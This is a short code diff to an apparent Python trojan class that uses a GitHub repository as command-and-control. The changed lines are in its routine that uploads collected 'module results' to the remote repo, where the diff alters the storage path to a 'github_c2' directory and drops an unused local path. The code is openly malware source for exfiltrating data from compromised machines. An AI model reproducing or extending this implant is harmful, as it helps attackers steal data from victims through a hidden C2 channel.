@@ -59,7 +59,6 @@ class Trojan:
     def __init__(self, id):
         self.id = id
         self.config_file = f"{id}.json"
-        self.data_path = f"./data/{id}/"
         self.repo = github_connect()
     
     def get_config(self):
@@ -81,7 +80,7 @@ class Trojan:
     
     def store_module_result(self, data):
         message = datetime.now().isoformat()
-        remote_path = f"data/{self.id}/{message}.data"
+        remote_path = f"./github_c2/data/{self.id}/{message}.data"
         bindata = bytes("%r" % data, "utf-8")
         self.repo.create_file(
             remote_path,
